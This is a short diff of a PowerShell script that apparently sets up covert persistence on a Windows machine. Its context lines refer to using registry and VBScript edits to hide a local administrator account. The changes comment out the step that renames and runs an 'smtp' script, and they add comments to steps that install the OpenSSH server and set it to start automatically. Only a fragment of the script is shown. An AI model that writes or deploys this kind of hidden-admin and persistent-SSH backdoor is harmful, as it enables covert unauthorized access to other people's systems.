@@ -41,8 +41,8 @@ $initial_dir = $PWD.Path
 # Go to temp, make working directory
 mkdir $path
 Set-Location $path
-Move-Item $initial_dir/smtp.txt ./smtp.ps1
-./smtp.ps1
+# Move-Item $initial_dir/smtp.txt ./smtp.ps1
+# ./smtp.ps1
 
 
 # Registry and VBScript to hide local admin
@@ -59,9 +59,14 @@ catch {
 
 # Enable persistent SSH
 try {
+    # Install the OpenSSH Server feature
     Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+
+    # Start the OpenSSH Server service
     Start-Service sshd
-    Set-Service -Name sshd -StartupType 'Automatic'
+
+    # Set the OpenSSH Server service to start automatically
+    Set-Service -Name sshd -StartupType Automatic
 }
 catch {
     Write-Error "Failed to enable or start SSH service. Make sure the script is run with elevated permissions."
